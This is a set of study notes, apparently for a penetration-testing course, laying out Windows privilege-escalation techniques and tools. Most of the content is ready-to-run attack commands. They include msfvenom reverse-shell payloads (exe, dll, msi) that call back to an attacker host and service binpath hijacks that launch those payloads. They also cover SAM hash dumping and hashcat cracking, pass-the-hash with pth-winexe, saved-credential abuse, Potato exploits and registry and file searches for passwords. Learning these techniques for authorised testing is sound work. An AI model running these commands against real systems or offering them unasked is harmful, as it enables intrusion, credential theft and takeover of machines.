# Windows priv Escalation
All privilege escalations are effectively examples of access control violations

## Understanding Permission
User accounts
Service accounts 
    -  cannot login with this
    -  SYSTEM account has highest level of priveleges

Groups
Resources
* Files/Directories
* Registry

ACLs

## Spawning Admin Shells
msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST= <host ip> LPORT=<host port> -f exe -o reverse.exe
#On windows use SMB
copy  \\<host ip>\\reverse.exe
./reverse.exe
```

If RDP is available we can add our low priv user to admin group
```
net localgroup administrators <usermame> /add
```

## Priv escalation tools
winPeas, Seatbelt,(PowerUp)[https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1], (SharpUp)[https://github.com/GhostPack/SharpUp]

Seatbelt[https://github.com/GhostPack/Seatbelt]

winPeas [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS]
- Main tool
Run this command to add color to output
```
    reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

## Kernel Exploits
Finding
1. Enumerate Windows/version(systemInfo)
2.  Find matching exploits (Google, ExploitDB)
3. Compile and run
Use as a **last resort** since they can crash the system

Windows Exploit Suggester
https://github.com/bitsadmin/wesng

Precompiled Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits

watson: https://github.com/rasta-mouse/Watson


## Services exploits
Query the configuration of a service
```
sc.exe qc <name>
```

Query the current status of a service:
```
sc.exe query <name>
```

Modify a configuration option of a service
```
sc.exe config <name> <option>= <value>
```

Start/stop a service
```
net start/stop <name>
```

### Insecure Service Permissions
Each service has an ACL which defines certain service-spefic permissions.

If the user has permission to change the configuration of a service which runs with System Privileges, we can change the executable the service uses to on of our own

**Potential Rabbit Hole**  If you can change the service configuration but cannot start/stop the service, you may not be able to escalate privileges

```
sc config <service> binpath="\"C:\PrivEsc\reverse.exe\""
net start <service>
```

### Unquoted Service Path
for example:
C:\Pogram Files\Some Dir\SomeProgam.exe  

can be highjacked by added an exe where spaces are
we can create a file in c:\Progam File\Some.exe and the service will call our exe

### Weak Registry Permissions
The Windows registry stores entries for each service.
Since registry entried can have ACLs, if the ACLs is misconfigured, it may be possible to modify a service's configuration even if we cannot modify the service directly.

```
Use Winpeas to find registry entry
reg query
reg edit
Change the path that registry key is pointing to
```

### Insecure Service Executables
If the original service executable is modifiable by your user, we can simply replace it with our reverse shell executable

use accesscheck - https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

### DLL Hijacking
Often a service will try to load functionality from DLL.  If we can replace the DLL we can use it to exploit.

Use ProcMon to determine the DLLs the service is trying to load
```
msfvenom -p windows/x64/shell_reverse LHOST=<ip>  LPORT=<port> -f dll  -o [dllname]
```


## Registry Exploits
Windows can be configured to run commands at startup with elevated priviliges
These AutoRuns are configured in the Registry
Replace the exe
Restart may run the program with the permissions of last logged in user


## AlwaysInstallElevated
MSI fules are package files used to install applications
AllwaysInstallElevated must be set to 1 from both local machine
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
and current user:
HKCU\Software\Policies\Microsoft\Windows\Installer


```
winPeASany.exe quiet windowscreds
msfvenom -p windows/x64/shell_reverse LHOST=<ip>  LPORT=<port> -f msi  -o reverse.msi
#Copy to windows
msiexec /quiet /qn /i reverse.msi
```

## Passwords
In cofing files, registry

Registry check
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
winPeasAny.exe quiet filesinfo userinfo
##If credentials found
winexe -U "<user>%<password> //192.168.1.22 cmd.exe
```

### Saved Creds
Runas command
You can use saved creds to runas different users

```
winPeasAny.exe quiet cmd windowscreds
cmdkey /list
runas /savedcred /user:admin C:\reverse.exe
```

### Searching for config files

```
#recursive 
dir /s *pass* = *.config
#current dire
findstr /si password *.xml *.ini *.txt
winPeasAny quiet cmd searchfast filesinfo
```

### SAM
Security Account Manager and System files in
c:\windows\System32\config
but may locked
backups
c:\windows\repair
c:\windows\system32\config\regback

Copy SAM and SYSTEM to kali
Use pwdump.py from https://github.com/Neohapsis/creddump7
```python
python2 pwdump.py /System /SAM
#get hashes - first hash is empty and same for every  user
hashcat -m 1000 --force [hash] /usr/share/worlists/rockyou.txt
```

### Passing the hash
Windows accepts hashes instead of passwords to authenticate number of services
https://github.com/byt3bl33d3r/pth-toolkit

use modified version of win.exe on kali
```
pth-winexe --system -U <LM:NTLM hash>  //<targetIp> cmd.exe
```

## Scheduled tasks
```
schtasks /query /fo LIST /v
```
Modify scripts to call reverse.exe


## Insecure GUI Apps
On some (older) versions of Windows, users could be granted perssion to run certain GUI apps with adminstrator priviliges

if you find a app running as admin 
tasklist /V | findstr <name.exe>

and it has an open file method:

```
file://c:/windows/system32/cmd.exe
```


## Startup Apps
Each user can define apps that start when they log in.

C:\ProgamData\Microsoft\Windows\Start Menu\Programs\Startup

has apps for all users.  This only accepts Shortcuts

If we can create a file in this directory we can use our reverse shell executable and escalate  priveleges when an admin logs in.

Create a shortcut to reverse shell and copy it to above location


## Installed Apps
Exploit-db.com

Filters: Type: local,  Platform : windows, Has App checked, search: Priv esc

Most of the exploits based on all the ones we covered

```
tasklist 
seatbelt.exe NonstandardProcesses
WinPeasany.exe quiet processinfo
```

## Hot Potato
Attack that uses spoofing attack along with an NTLM relay attack to gain SYSTEM privileges

potato.exe
on windows 7

```
potato.exe -ip <ip of windows machine> -cmd reverseshell.exe -enable_http_server true -enable_defender ture -enable_spoof true -eanale_exhaust true
```

## Juicy Potato
Service Accounts
 https://github.com/ohpe/juicy-potato

 First get a shell with service account by exploiting ASP code or xp_cmdshell SQL...
 ```
 juicypotato.exe -l <port> -p  reverseshell.exe -t * -c {Classid from github}
 ```

 ## Port Forwarding
 Sometimes it is easier to run exploit code on kali, but the vulnerable program is listening on an internal port
 We can forward a port on Kali to the internal port on Windows

 We can do this using a program called plink.exe (from the makers of PUTTY)


 ## Strategy
 * Enumeration
    1. Check your user (whoami) and groups(net user <usermame>)
    2. Run winPEAS with fast, searchfast and cmd options
    3. Run Seatbelt and other scripts as well
    4. If scripts dont work, work manually.  Cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

* Be patient.. avoid rabbit holes.  If you can modify a service but can't stop or start it, then you can't use the exploit
* Try easy ones like registry and services exploits first
